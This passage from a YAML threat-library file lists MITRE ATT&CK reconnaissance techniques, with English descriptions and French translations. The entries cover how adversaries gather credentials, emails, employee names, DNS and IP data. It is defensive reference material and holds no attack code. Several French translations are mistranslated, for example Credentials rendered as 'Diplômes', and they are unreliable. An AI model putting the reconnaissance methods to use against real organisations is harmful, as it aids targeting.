          \ ces noms d\u2019utilisateur. (Citation : Nom d\u2019utilisateur GrimBlogEnum)(Citation\
          \ : Abus SSPR d\u2019Obsidian 2023) Les informations sur les victimes peuvent\
          \ \xE9galement \xEAtre expos\xE9es aux adversaires via des ensembles de\
          \ donn\xE9es en ligne ou d\u2019autres donn\xE9es accessibles (ex : [R\xE9\
          seaux sociaux](https://attack.mitre.org/techniques/T1593/001) ou [Recherche\
          \ sur les sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : Fuite OPM)(Citation : Register Deloitte)(Citation : Register\
          \ Uber)(Citation : D\xE9tecter les jetons Slack)(Citation : Forbes GitHub\
          \ Creds)(Citation : GitHub truffleHog)(Citation : GitHub Gitrob)(Citation\
          \ : CNET fuites)\n\nLa collecte de ces informations peut r\xE9v\xE9ler d\u2019\
          autres formes de reconnaissance (ex : [Rechercher des sites web/domaines\
          \ ouverts](https://attack.mitre.org/techniques/T1593) ou [Phishing for Information](https://attack.mitre.org/techniques/T1598)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Compromis\
          \ des comptes](https://attack.mitre.org/techniques/T1586)), et/ou un acc\xE8\
          s initial (ex : [Phishing](https://attack.mitre.org/techniques/T1566) ou\
          \ [Comptes valides]( https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1589"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.001
    ref_id: T1589.001
    name: Credentials
    description: 'Adversaries may gather credentials that can be used during targeting.
      Account credentials gathered by adversaries may be those directly associated
      with the target victim organization or attempt to take advantage of the tendency
      for users to use the same passwords across personal and business accounts.


      Adversaries may gather credentials from potential victims in various ways, such
      as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598).
      Adversaries may also compromise sites then add malicious content designed to
      collect website authentication cookies from visitors.(Citation: ATT ScanBox)
      (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack
      Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation:
      GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA)
      based on out-of-band communications is in use, adversaries may compromise a
      service provider to gain access to MFA codes and one-time passwords (OTP).(Citation:
      Okta Scatter Swine 2022)


      Credential information may also be exposed to adversaries via leaks to online
      or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002),
      breach dumps, code repositories, etc.). Adversaries may purchase credentials
      from dark web markets, such as Russian Market and 2easy, or through access to
      Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping
      Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping
      Computer Stealer Logs 2023)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589/001'
    translations:
      fr:
        name: "Dipl\xF4mes"
        description: "Les adversaires peuvent rassembler des accr\xE9ditations qui\
          \ peuvent \xEAtre utilis\xE9es lors du ciblage. Les identifiants de compte\
          \ recueillis par les adversaires peuvent \xEAtre directement associ\xE9\
          s \xE0 l\u2019organisation victime cibl\xE9e ou tenter de profiter de la\
          \ tendance des utilisateurs \xE0 utiliser les m\xEAmes mots de passe entre\
          \ comptes personnels et professionnels.\n\nLes adversaires peuvent recueillir\
          \ des identifiants aupr\xE8s de victimes potentielles de diff\xE9rentes\
          \ mani\xE8res, comme par l\u2019obtention directe via [Phishing for Information](https://attack.mitre.org/techniques/T1598).\
          \ Les adversaires peuvent \xE9galement compromettre des sites puis ajouter\
          \ du contenu malveillant destin\xE9 \xE0 collecter les cookies d\u2019authentification\
          \ des sites aupr\xE8s des visiteurs. (Citation : ATT ScanBox) (Citation\
          \ : Register Deloitte)(Citation : Register Uber)(Citation : D\xE9tecter\
          \ les jetons Slack)(Citation : Forbes GitHub Creds)(Citation : GitHub truffleHog)(Citation\
          \ : GitHub Gitrob)(Citation : CNET fuites) Lorsque l\u2019authentification\
          \ multi-facteurs (MFA) bas\xE9e sur des communications hors bande est utilis\xE9\
          e, des adversaires peuvent compromettre un fournisseur de services pour\
          \ acc\xE9der aux codes MFA et aux mots de passe \xE0 usage unique (OTP).\
          \ (Citation : Okta Scatter Swine 2022)\n\nLes informations sur les accr\xE9\
          ditations peuvent \xE9galement \xEAtre expos\xE9es aux adversaires via des\
          \ fuites vers des ensembles de donn\xE9es en ligne ou d\u2019autres donn\xE9\
          es accessibles (ex : [moteurs de recherche](https://attack.mitre.org/techniques/T1593/002),\
          \ dumps de br\xE8ches, d\xE9p\xF4ts de code, etc.). Les adversaires peuvent\
          \ acheter des identifiants sur des march\xE9s du dark web, tels que Russian\
          \ Market et 2easy, ou via l\u2019acc\xE8s \xE0 des canaux Telegram qui distribuent\
          \ les journaux des logiciels malveillants infostealers. (Citation : Ordinateur\
          \ bip 2easy 2021)(Citation : SecureWorks Infostealers 2023)(Citation : Journals\
          \ du voleur d\u2019ordinateur bip\xE9 2023)\n\nLa collecte de ces informations\
          \ peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance (ex : [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Phishing for Information](https://attack.mitre.org/techniques/T1598)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Comptes\
          \ de compromis](https://attack.mitre.org/techniques/T1586)), et/ou l\u2019\
          acc\xE8s initial (ex : [Services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)\
          \ ou [Valide Comptes](https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1589/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.002
    ref_id: T1589.002
    name: Email Addresses
    description: 'Adversaries may gather email addresses that can be used during targeting.
      Even if internal instances exist, organizations may have public-facing email
      infrastructure and addresses for employees.


      Adversaries may easily gather email addresses, since they may be readily available
      and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated
      via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)),
      such as probing and analyzing responses from authentication services that may
      reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example,
      adversaries may be able to enumerate email addresses in Office 365 environments
      by querying a variety of publicly available API endpoints, such as autodiscover
      and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation:
      Azure Active Directory Reconnaisance)


      Gathering this information may reveal opportunities for other forms of reconnaissance
      (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote
      Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1589/002'
    translations:
      fr:
        name: Adresses e-mail
        description: "Les adversaires peuvent rassembler des adresses e-mail qui peuvent\
          \ \xEAtre utilis\xE9es lors du ciblage. M\xEAme si des instances internes\
          \ existent, les organisations peuvent disposer d\u2019une infrastructure\
          \ de messagerie et d\u2019adresses publiques pour les employ\xE9s.\n\nLes\
          \ adversaires peuvent facilement recueillir des adresses e-mail, puisqu\u2019\
          elles peuvent \xEAtre facilement accessibles et expos\xE9es via des ensembles\
          \ de donn\xE9es en ligne ou d\u2019autres ensembles de donn\xE9es accessibles\
          \ (ex : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Rechercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : Email HackersArise)(Citation : CNET fuites) Les adresses e-mail\
          \ pouvaient \xE9galement \xEAtre \xE9num\xE9r\xE9es par des moyens plus\
          \ actifs (par exemple [Analyse active](https://attack.mitre.org/techniques/T1595)),\
          \ comme la recherche et l\u2019analyse des r\xE9ponses des services d\u2019\
          authentification qui peuvent r\xE9v\xE9ler des noms d\u2019utilisateur valides\
          \ dans un syst\xE8me. (Citation : Nom d\u2019utilisateur GrimBlogEnum) Par\
          \ exemple, les adversaires peuvent \xEAtre capables d\u2019\xE9num\xE9rer\
          \ des adresses e-mail dans des environnements Office 365 en interrogeant\
          \ divers points d\u2019acc\xE8s API publics, tels que l\u2019autodiscover\
          \ et GetCredentialType. (Citation : Num\xE9ration des utilisateurs GitHub\
          \ Office 365)(Citation : Azure Active Directory Reconnaisance)\n\nLa collecte\
          \ de ces informations peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance\
          \ (ex : [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)\
          \ ou [Phishing pour information](https://attack.mitre.org/techniques/T1598)),\
          \ la mise en place de ressources op\xE9rationnelles (ex : [comptes email](https://attack.mitre.org/techniques/T1586/002)),\
          \ et/ou un acc\xE8s initial (ex : [Phishing](https://attack.mitre.org/techniques/T1566)\
          \ ou [Brute Force]( https://attack.mitre.org/techniques/T1110) via [Services\
          \ externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          https://attack.mitre.org/techniques/T1589/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1589.003
    ref_id: T1589.003
    name: Employee Names
    description: 'Adversaries may gather employee names that can be used during targeting.
      Employee names be used to derive email addresses as well as to help guide other
      reconnaissance efforts and/or craft more-believable lures.


      Adversaries may easily gather employee names, since they may be readily available
      and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001)
      or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      OPM Leak) Gathering this information may reveal opportunities for other forms
      of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)
      or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)
      or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).

      https://attack.mitre.org/techniques/T1589/003'
    translations:
      fr:
        name: "Noms des employ\xE9s"
        description: "Les adversaires peuvent recueillir des noms d\u2019employ\xE9\
          s qui peuvent \xEAtre utilis\xE9s lors du ciblage. Les noms des employ\xE9\
          s peuvent servir \xE0 obtenir des adresses e-mail ainsi qu\u2019\xE0 guider\
          \ d\u2019autres missions de reconnaissance et/ou \xE0 concevoir des leurres\
          \ plus cr\xE9dibles.\n\nLes adversaires peuvent facilement recueillir les\
          \ noms des employ\xE9s, car ils peuvent \xEAtre facilement accessibles et\
          \ expos\xE9s via des ensembles de donn\xE9es en ligne ou d\u2019autres donn\xE9\
          es accessibles (ex. : [R\xE9seaux sociaux](https://attack.mitre.org/techniques/T1593/001)\
          \ ou [Chercher des sites web appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : Fuite OPM) La collecte de ces informations peut r\xE9v\xE9\
          ler d\u2019autres formes de reconnaissance (ex : [Rechercher des sites web/domaines\
          \ ouverts](https://attack.mitre.org/techniques/T1593) ou [Phishing for Information](https://attack.mitre.org/techniques/T1598)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Compromis\
          \ des comptes](https://attack.mitre.org/techniques/T1586)), et/ou un acc\xE8\
          s initial (ex : [Phishing](https://attack.mitre.org/techniques/T1566) ou\
          \ [Comptes valides]( https://attack.mitre.org/techniques/T1078)).\nhttps://attack.mitre.org/techniques/T1589/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590
    ref_id: T1590
    name: Gather Victim Network Information
    description: 'Adversaries may gather information about the victim''s networks
      that can be used during targeting. Information about networks may include a
      variety of details, including administrative data (ex: IP ranges, domain names,
      etc.) as well as specifics regarding its topology and operations.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about networks may also be exposed to adversaries via online or other accessible
      data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1590'
    translations:
      fr:
        name: "Recueillez des informations sur le r\xE9seau des victimes"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ r\xE9seaux de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les r\xE9seaux peuvent inclure une vari\xE9t\xE9\
          \ de d\xE9tails, notamment des donn\xE9es administratives (ex. : plages\
          \ IP, noms de domaine, etc.) ainsi que des d\xE9tails concernant leur topologie\
          \ et leurs op\xE9rations.\n\nLes adversaires peuvent recueillir ces informations\
          \ de diff\xE9rentes mani\xE8res, telles que par des actions de collecte\
          \ directe via [Scan Actif](https://attack.mitre.org/techniques/T1595) ou\
          \ [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les r\xE9seaux peuvent \xE9galement \xEAtre expos\xE9\
          es aux adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ donn\xE9es accessibles (ex : [Recherche dans les bases de donn\xE9es techniques\
          \ ouvertes](https://attack.mitre.org/techniques/T1596)). (Citation : WHOIS)(Citation\
          \ : Conteneur DNS)(Citation : DNS passif circulaire) La collecte de ces\
          \ informations peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance\
          \ (ex : [Scan actif](https://attack.mitre.org/techniques/T1595) ou [Rechercher\
          \ des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition\
          \ d\u2019infrastructure](https://attack.mitre.org/techniques/T1583) ou [Compromission\
          \ d\u2019infrastructure](https://attack.mitre.org/techniques/T1584)), et/ou\
          \ d\u2019acc\xE8s initial (ex : [Fiable Relation](https://attack.mitre.org/techniques/T1199)).\n\
          https://attack.mitre.org/techniques/T1590"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.001
    ref_id: T1590.001
    name: Domain Properties
    description: 'Adversaries may gather information about the victim''s network domain(s)
      that can be used during targeting. Information about domains and their properties
      may include a variety of details, including what domain(s) the victim owns as
      well as administrative data (ex: name, registrar, etc.) and more directly actionable
      information such as contacts (email addresses and phone numbers), business addresses,
      and name servers.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about victim domains and their properties may also be exposed to adversaries
      via online or other accessible data sets (ex: [WHOIS](https://attack.mitre.org/techniques/T1596/002)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Where third-party
      cloud providers are in use, this information may also be exposed through publicly
      available API endpoints, such as GetUserRealm and autodiscover in Office 365
      environments.(Citation: Azure Active Directory Reconnaisance)(Citation: Office
      265 Azure Domain Availability) Gathering this information may reveal opportunities
      for other forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596),
      [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593), or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing
      operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).

      https://attack.mitre.org/techniques/T1590/001'
    translations:
      fr:
        name: "Propri\xE9t\xE9s de domaine"
        description: "Les adversaires peuvent recueillir des informations sur le(s)\
          \ domaine(s) r\xE9seau de la victime, qui peuvent \xEAtre utilis\xE9es lors\
          \ du ciblage. Les informations sur les domaines et leurs propri\xE9t\xE9\
          s peuvent inclure une vari\xE9t\xE9 de d\xE9tails, notamment le(s) domaine(s)\
          \ d\xE9tenu(s) par la victime ainsi que des donn\xE9es administratives (ex.\
          \ : nom, registraire, etc.) et des informations plus directement exploitables\
          \ telles que les contacts (adresses email et num\xE9ros de t\xE9l\xE9phone),\
          \ les adresses professionnelles et les serveurs de noms.\n\nLes adversaires\
          \ peuvent recueillir ces informations de diff\xE9rentes mani\xE8res, telles\
          \ que par des actions de collecte directe via [Scan Actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les domaines des victimes et leurs biens peuvent\
          \ \xE9galement \xEAtre expos\xE9es aux adversaires via des ensembles de\
          \ donn\xE9es en ligne ou autres donn\xE9es accessibles (ex : [WHOIS](https://attack.mitre.org/techniques/T1596/002)).\
          \ (Citation : WHOIS)(Citation : Conteneur DNS)(Citation : DNS passif circulaire)\
          \ Lorsque des fournisseurs cloud tiers sont utilis\xE9s, ces informations\
          \ peuvent \xE9galement \xEAtre expos\xE9es via des points de terminaison\
          \ API publics, tels que GetUserRealm et la d\xE9couverte automatique dans\
          \ les environnements Office 365. (Citation : Azure Active Directory Reconnaisance)(Citation\
          \ : Office 265 Azure Domain Availability) La collecte de ces informations\
          \ peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance (par exemple\
          \ : [Rechercher dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596),\
          \ [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593),\
          \ ou [Phishing pour information](https://attack.mitre.org/techniques/T1598)),\
          \ \xE9tablir des ressources op\xE9rationnelles (ex : [Acqu\xE9rir des infrastructures](https://attack.mitre.org/techniques/T1583)\
          \ ou [Compromis Infrastructure](https://attack.mitre.org/techniques/T1584)),\
          \ et/ou acc\xE8s initial (ex : [Phishing](https://attack.mitre.org/techniques/T1566)).\n\
          https://attack.mitre.org/techniques/T1590/001"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.002
    ref_id: T1590.002
    name: DNS
    description: "Adversaries may gather information about the victim's DNS that can\
      \ be used during targeting. DNS information may include a variety of details,\
      \ including registered name servers as well as records that outline addressing\
      \ for a target\u2019s subdomains, mail servers, and other hosts. DNS MX, TXT,\
      \ and SPF records may also reveal the use of third party cloud and SaaS providers,\
      \ such as Office 365, G Suite, Salesforce, or Zendesk.(Citation: Sean Metcalf\
      \ Twitter DNS Records)\n\nAdversaries may gather this information in various\
      \ ways, such as querying or otherwise collecting details via [DNS/Passive DNS](https://attack.mitre.org/techniques/T1596/001).\
      \ DNS information may also be exposed to adversaries via online or other accessible\
      \ data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:\
      \ DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information may\
      \ reveal opportunities for other forms of reconnaissance (ex: [Search Open Technical\
      \ Databases](https://attack.mitre.org/techniques/T1596), [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593),\
      \ or [Active Scanning](https://attack.mitre.org/techniques/T1595)), establishing\
      \ operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)\
      \ or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),\
      \ and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).\n\
      \nAdversaries may also use DNS zone transfer (DNS query type AXFR) to collect\
      \ all records from a misconfigured DNS server.(Citation: Trails-DNS)(Citation:\
      \ DNS-CISA)(Citation: Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
    translations:
      fr:
        name: DNS
        description: "Les adversaires peuvent recueillir des informations sur le DNS\
          \ de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage. Les informations\
          \ DNS peuvent inclure une vari\xE9t\xE9 de d\xE9tails, notamment des serveurs\
          \ de noms enregistr\xE9s ainsi que des enregistrements qui d\xE9taillent\
          \ l\u2019adressage des sous-domaines, serveurs de messagerie et autres h\xF4\
          tes d\u2019une cible. Les enregistrements DNS, MX, TXT et SPF peuvent \xE9\
          galement r\xE9v\xE9ler l\u2019utilisation de fournisseurs tiers de cloud\
          \ et SaaS, tels qu\u2019Office 365, G Suite, Salesforce ou Zendesk. (Citation\
          \ : Sean Metcalf Enregistrements DNS Twitter)\n\nLes adversaires peuvent\
          \ recueillir ces informations de diff\xE9rentes mani\xE8res, comme en interrogeant\
          \ ou en collectant des d\xE9tails via [DNS/DNS passif](https://attack.mitre.org/techniques/T1596/001).\
          \ Les informations DNS peuvent \xE9galement \xEAtre expos\xE9es aux adversaires\
          \ via des ensembles de donn\xE9es en ligne ou autres donn\xE9es accessibles\
          \ (ex : [Recherche dans les bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)).\
          \ (Citation : Conteneur DNS)(Citation : DNS passif circulaire) La collecte\
          \ de ces informations peut r\xE9v\xE9ler d\u2019autres formes de reconnaissance\
          \ (ex : [Recherche dans des bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596),\
          \ [Recherche dans des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593),\
          \ ou [Scan actif](https://attack.mitre.org/techniques/T1595)), l\u2019\xE9\
          tablissement de ressources op\xE9rationnelles (ex : [Acquisition d\u2019\
          infrastructure](https://attack.mitre.org/techniques/T1583) ou [Infrastructure\
          \ compromise]( https://attack.mitre.org/techniques/T1584)), et/ou acc\xE8\
          s initial (ex : [Services externes \xE0 distance](https://attack.mitre.org/techniques/T1133)).\n\
          \nLes adversaires peuvent \xE9galement utiliser le transfert de zone DNS\
          \ (type de requ\xEAte DNS AXFR) pour collecter tous les enregistrements\
          \ d\u2019un serveur DNS mal configur\xE9. (Citation : Trails-DNS)(Citation\
          \ : DNS-CISA)(Citation : Alexa-dns)\nhttps://attack.mitre.org/techniques/T1590/002"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.003
    ref_id: T1590.003
    name: Network Trust Dependencies
    description: 'Adversaries may gather information about the victim''s network trust
      dependencies that can be used during targeting. Information about network trusts
      may include a variety of details, including second or third-party organizations/domains
      (ex: managed service providers, contractors, etc.) that have connected (and
      potentially elevated) network access.


      Adversaries may gather this information in various ways, such as direct elicitation
      via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about network trusts may also be exposed to adversaries via online or other
      accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      Pentesting AD Forests) Gathering this information may reveal opportunities for
      other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).

      https://attack.mitre.org/techniques/T1590/003'
    translations:
      fr:
        name: "D\xE9pendances de confiance r\xE9seau"
        description: "Les adversaires peuvent recueillir des informations sur les\
          \ d\xE9pendances de confiance r\xE9seau de la victime qui peuvent \xEAtre\
          \ utilis\xE9es lors du ciblage. Les informations sur les trusts r\xE9seau\
          \ peuvent inclure une vari\xE9t\xE9 de d\xE9tails, y compris des organisations/domaines\
          \ de seconde ou tierce partie (par exemple : fournisseurs de services manag\xE9\
          s, sous-traitants, etc.) qui ont un acc\xE8s r\xE9seau connect\xE9 (et potentiellement\
          \ \xE9lev\xE9).\n\nLes adversaires peuvent recueillir ces informations de\
          \ diff\xE9rentes mani\xE8res, comme par l\u2019obtention directe via [Phishing\
          \ for Information](https://attack.mitre.org/techniques/T1598). Les informations\
          \ sur les trusts r\xE9seau peuvent \xE9galement \xEAtre expos\xE9es aux\
          \ adversaires via des ensembles de donn\xE9es en ligne ou d\u2019autres\
          \ ensembles de donn\xE9es accessibles (ex : [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).\
          \ (Citation : Pentesting AD Forests) La collecte de ces informations peut\
          \ r\xE9v\xE9ler d\u2019autres formes de reconnaissance (ex : [Scan actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ l\u2019\xE9tablissement de ressources op\xE9rationnelles (ex : [Acquisition\
          \ d\u2019infrastructure](https://attack.mitre.org/techniques/T1583) ou [Compromission\
          \ d\u2019infrastructure](https://attack.mitre.org/techniques/T1584)), et/ou\
          \ d\u2019acc\xE8s initial (ex : [Fiable Relation](https://attack.mitre.org/techniques/T1199)).\n\
          https://attack.mitre.org/techniques/T1590/003"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.004
    ref_id: T1590.004
    name: Network Topology
    description: 'Adversaries may gather information about the victim''s network topology
      that can be used during targeting. Information about network topologies may
      include a variety of details, including the physical and/or logical arrangement
      of both external-facing and internal network environments. This information
      may also include specifics regarding network devices (gateways, routers, etc.)
      and other infrastructure.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about network topologies may also be exposed to adversaries via online or other
      accessible data sets (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation:
      DNS Dumpster) Gathering this information may reveal opportunities for other
      forms of reconnaissance (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/004'
    translations:
      fr:
        name: "Topologie du r\xE9seau"
        description: "Les adversaires peuvent recueillir des informations sur la topologie\
          \ du r\xE9seau de la victime qui peuvent \xEAtre utilis\xE9es lors du ciblage.\
          \ Les informations sur les topologies r\xE9seau peuvent inclure une vari\xE9\
          t\xE9 de d\xE9tails, notamment l\u2019agencement physique et/ou logique\
          \ des environnements r\xE9seau externes et internes. Ces informations peuvent\
          \ \xE9galement inclure des d\xE9tails concernant les dispositifs r\xE9seau\
          \ (passerelles, routeurs, etc.) et d\u2019autres infrastructures.\n\nLes\
          \ adversaires peuvent recueillir ces informations de diff\xE9rentes mani\xE8\
          res, telles que par des actions de collecte directe via [Scan Actif](https://attack.mitre.org/techniques/T1595)\
          \ ou [Phishing pour obtenir des informations](https://attack.mitre.org/techniques/T1598).\
          \ Les informations sur les topologies r\xE9seau peuvent \xE9galement \xEA\
          tre expos\xE9es aux adversaires via des ensembles de donn\xE9es en ligne\
          \ ou d\u2019autres donn\xE9es accessibles (ex : [Rechercher des sites web\
          \ appartenant aux victimes](https://attack.mitre.org/techniques/T1594)).\
          \ (Citation : Conteneur DNS) La collecte de ces informations peut r\xE9\
          v\xE9ler d\u2019autres formes de reconnaissance (ex : [Rechercher dans des\
          \ bases de donn\xE9es techniques ouvertes](https://attack.mitre.org/techniques/T1596)\
          \ ou [Rechercher des sites web/domaines ouverts](https://attack.mitre.org/techniques/T1593)),\
          \ d\u2019\xE9tablir des ressources op\xE9rationnelles (ex : [Acqu\xE9rir\
          \ une infrastructure](https://attack.mitre.org/techniques/T1583) ou [Compromettre\
          \ l\u2019infrastructure](https://attack.mitre.org/techniques/T1584)), et/ou\
          \ d\u2019un acc\xE8s initial (ex : [Externe \xE0 distance] Services](https://attack.mitre.org/techniques/T1133)).\n\
          https://attack.mitre.org/techniques/T1590/004"
  - urn: urn:intuitem:risk:threat:mitre-attack:t1590.005
    ref_id: T1590.005
    name: IP Addresses
    description: 'Adversaries may gather the victim''s IP addresses that can be used
      during targeting. Public IP addresses may be allocated to organizations by block,
      or a range of sequential addresses. Information about assigned IP addresses
      may include a variety of details, such as which IP addresses are in use. IP
      addresses may also enable an adversary to derive other details about a victim,
      such as organizational size, physical location(s), Internet service provider,
      and or where/how their publicly-facing infrastructure is hosted.


      Adversaries may gather this information in various ways, such as direct collection
      actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or
      [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information
      about assigned IP addresses may also be exposed to adversaries via online or
      other accessible data sets (ex: [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)).(Citation:
      WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Gathering this information
      may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595)
      or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)),
      establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583)
      or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)),
      and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133)).

      https://attack.mitre.org/techniques/T1590/005'
    translations:
      fr:
        name: Adresses IP
        description: "Les adversaires peuvent recueillir les adresses IP de la victime\
